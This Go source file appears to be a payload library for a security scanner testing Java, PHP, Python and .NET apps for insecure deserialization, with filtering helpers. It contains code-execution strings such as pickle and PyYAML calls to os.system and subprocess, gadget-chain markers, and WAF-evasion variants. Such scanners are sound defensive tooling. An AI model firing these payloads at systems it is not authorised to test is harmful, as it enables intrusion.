// Package deser provides insecure deserialization payloads for multiple platforms.
// Payloads are categorized by:
//   - Serialization variant (Java, PHP, Python, .NET)
//   - Detection technique (Marker, Error, Time-based, Blind)
//   - Context (Object markers, class instantiation, gadget chains)
package deser

// Variant represents a serialization platform variant.
type Variant string

const (
	// Java represents Java serialization (ObjectInputStream).
	Java Variant = "java"
	// PHP represents PHP serialize/unserialize.
	PHP Variant = "php"
	// Python represents Python pickle deserialization.
	Python Variant = "python"
	// DotNet represents .NET BinaryFormatter/ObjectStateFormatter.
	DotNet Variant = "dotnet"
	// Generic represents generic deserialization markers.
	Generic Variant = "generic"
)

// Technique represents a detection technique.
type Technique string

const (
	// TechMarker uses serialized object markers to detect deserialization.
	TechMarker Technique = "marker"
	// TechError triggers deserialization errors for detection.
	TechError Technique = "error"
	// TechTimeBased uses time delays during deserialization.
	TechTimeBased Technique = "time"
	// TechBlind uses out-of-band callbacks for detection.
	TechBlind Technique = "blind"
)

// Payload represents a deserialization test payload.
type Payload struct {
	Value       string
	Technique   Technique
	Variant     Variant
	Description string
	WAFBypass   bool
}

// GetPayloads returns payloads for a specific serialization variant.
func GetPayloads(variant Variant) []Payload {
	switch variant {
	case Java:
		return javaPayloads
	case PHP:
		return phpPayloads
	case Python:
		return pythonPayloads
	case DotNet:
		return dotnetPayloads
	default:
		return genericPayloads
	}
}

// GetByTechnique returns payloads filtered by technique.
func GetByTechnique(variant Variant, technique Technique) []Payload {
	all := GetPayloads(variant)
	var result []Payload
	for _, p := range all {
		if p.Technique == technique {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads(variant Variant) []Payload {
	all := GetPayloads(variant)
	var result []Payload
	for _, p := range all {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all payloads for all variants.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, genericPayloads...)
	all = append(all, javaPayloads...)
	all = append(all, phpPayloads...)
	all = append(all, pythonPayloads...)
	all = append(all, dotnetPayloads...)
	return all
}

// DeduplicatePayloads removes duplicate payloads based on Value and Variant.
func DeduplicatePayloads(payloads []Payload) []Payload {
	seen := make(map[string]bool)
	var result []Payload
	for _, p := range payloads {
		key := p.Value + "|" + string(p.Variant)
		if !seen[key] {
			seen[key] = true
			result = append(result, p)
		}
	}
	return result
}

// Generic deserialization payloads that work across multiple platforms.
var genericPayloads = []Payload{
	{Value: "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Generic, Description: "Java serialized Boolean marker"},
	{Value: `O:8:"stdClass":0:{}`, Technique: TechMarker, Variant: Generic, Description: "PHP serialized stdClass marker"},
	{Value: "cos\nsystem\n(S'echo test'\ntR.", Technique: TechMarker, Variant: Generic, Description: "Python pickle system call marker"},
	{Value: `{"$type":"System.Object"}`, Technique: TechMarker, Variant: Generic, Description: ".NET JSON type discriminator"},
}

// Java-specific deserialization payloads.
// Source: ysoserial, PayloadsAllTheThings
var javaPayloads = []Payload{
	// Base64-encoded Java serialization markers
	{Value: "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Java, Description: "Java serialized Boolean object"},
	{Value: "rO0ABXNyABNqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAABh", Technique: TechMarker, Variant: Java, Description: "Java serialized Integer object"},
	{Value: "aced00057372001164756d6d792e64756d6d79", Technique: TechMarker, Variant: Java, Description: "Java magic bytes hex prefix aced0005"},

	// Error-triggering payloads
	{Value: "rO0ABXNyAA9pbnZhbGlkLkNsYXNzAA==", Technique: TechError, Variant: Java, Description: "Invalid class deserialization error"},
	{Value: "rO0ABXhyABdqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIAAA==", Technique: TechError, Variant: Java, Description: "ProcessBuilder deserialization attempt"},
	{Value: "aced0005737200", Technique: TechError, Variant: Java, Description: "Truncated Java serialized object"},

	// Time-based
	{Value: "rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXA=", Technique: TechTimeBased, Variant: Java, Description: "Commons Collections LazyMap gadget"},

	// WAF bypass variants
	{Value: "ro0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Java, Description: "Case-varied base64 Java marker", WAFBypass: true},
	{Value: "rO0ABXNyABFqYXZhLm%6Chbmcu%51m9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Java, Description: "URL-encoded base64 Java marker", WAFBypass: true},
}

// PHP-specific deserialization payloads.
// Source: PHPGGC, PayloadsAllTheThings
var phpPayloads = []Payload{
	// PHP serialize markers
	{Value: `O:8:"stdClass":0:{}`, Technique: TechMarker, Variant: PHP, Description: "PHP stdClass serialized object"},
	{Value: `O:7:"TestObj":1:{s:4:"test";s:5:"value";}`, Technique: TechMarker, Variant: PHP, Description: "PHP custom object serialized"},
	{Value: `a:1:{s:4:"test";s:5:"value";}`, Technique: TechMarker, Variant: PHP, Description: "PHP serialized array"},
	{Value: `O:11:"PharPayload":0:{}`, Technique: TechMarker, Variant: PHP, Description: "PHP Phar deserialization marker"},

	// Error-triggering payloads
	{Value: `O:99:"NonExistentClass":0:{}`, Technique: TechError, Variant: PHP, Description: "Non-existent class deserialization"},
	{Value: `O:8:"stdClass":1:{s:1:"x";O:99:"BadClass":0:{}}`, Technique: TechError, Variant: PHP, Description: "Nested bad class deserialization"},
	{Value: `O:`, Technique: TechError, Variant: PHP, Description: "Truncated PHP serialize string"},

	// Gadget chain markers
	{Value: `O:40:"Illuminate\\Broadcasting\\PendingBroadcast":0:{}`, Technique: TechMarker, Variant: PHP, Description: "Laravel PendingBroadcast gadget marker"},
	{Value: `O:32:"Monolog\\Handler\\SyslogUdpHandler":0:{}`, Technique: TechMarker, Variant: PHP, Description: "Monolog SyslogUdpHandler gadget marker"},

	// WAF bypass
	{Value: `O:+8:"stdClass":0:{}`, Technique: TechMarker, Variant: PHP, Description: "PHP serialize with plus sign bypass", WAFBypass: true},
	{Value: `O:8:"stdClass":0:{}; `, Technique: TechMarker, Variant: PHP, Description: "PHP serialize with trailing data bypass", WAFBypass: true},
}

// Python-specific deserialization payloads.
// Source: PayloadsAllTheThings
var pythonPayloads = []Payload{
	// Python pickle markers
	{Value: "cos\nsystem\n(S'echo test'\ntR.", Technique: TechMarker, Variant: Python, Description: "Python pickle os.system call"},
	{Value: "csubprocess\ncall\n(S'echo test'\ntR.", Technique: TechMarker, Variant: Python, Description: "Python pickle subprocess.call"},
	{Value: "\\x80\\x04\\x95", Technique: TechMarker, Variant: Python, Description: "Python pickle protocol 4 header"},
	{Value: "gASV", Technique: TechMarker, Variant: Python, Description: "Python pickle protocol 4 base64 header"},

	// Error-triggering payloads
	{Value: "cos\n_INVALID_\n(tR.", Technique: TechError, Variant: Python, Description: "Invalid pickle module reference"},
	{Value: "\\x80\\x04\\x95\\x00\\x00\\x00\\x00", Technique: TechError, Variant: Python, Description: "Truncated pickle payload"},

	// YAML deserialization (PyYAML)
	{Value: "!!python/object:__main__.TestObj {}", Technique: TechMarker, Variant: Python, Description: "PyYAML object instantiation marker"},
	{Value: "!!python/object/apply:os.system ['echo test']", Technique: TechMarker, Variant: Python, Description: "PyYAML os.system apply marker"},

	// WAF bypass
	{Value: "Y29zCnN5c3RlbQooUydlY2hvIHRlc3QnCnRSLg==", Technique: TechMarker, Variant: Python, Description: "Base64-encoded pickle payload", WAFBypass: true},
}

// .NET-specific deserialization payloads.
// Source: ysoserial.net, PayloadsAllTheThings
var dotnetPayloads = []Payload{
	// .NET serialization markers
	{Value: `__VIEWSTATE=/wEPDw==`, Technique: TechMarker, Variant: DotNet, Description: ".NET ViewState marker"},
	{Value: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}`, Technique: TechMarker, Variant: DotNet, Description: ".NET ObjectDataProvider JSON marker"},
	{Value: `{"$type":"System.Configuration.Install.AssemblyInstaller"}`, Technique: TechMarker, Variant: DotNet, Description: ".NET AssemblyInstaller JSON marker"},

	// Error-triggering payloads
	{Value: `__VIEWSTATE=AAAA`, Technique: TechError, Variant: DotNet, Description: "Invalid ViewState deserialization"},
	{Value: `{"$type":"System.InvalidClass, System"}`, Technique: TechError, Variant: DotNet, Description: "Invalid .NET type reference"},
	{Value: `<root type="System.Data.DataSet"><xs:schema></xs:schema></root>`, Technique: TechError, Variant: DotNet, Description: "DataSet XML deserialization marker"},

	// TypeConfuseDelegate gadget
	{Value: `{"$type":"System.Workflow.ComponentModel.Serialization.TypeConfuseDelegate"}`, Technique: TechMarker, Variant: DotNet, Description: "TypeConfuseDelegate gadget marker"},

	// WAF bypass
	{Value: `{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework"}`, Technique: TechMarker, Variant: DotNet, Description: "Spaced JSON type discriminator bypass", WAFBypass: true},
}
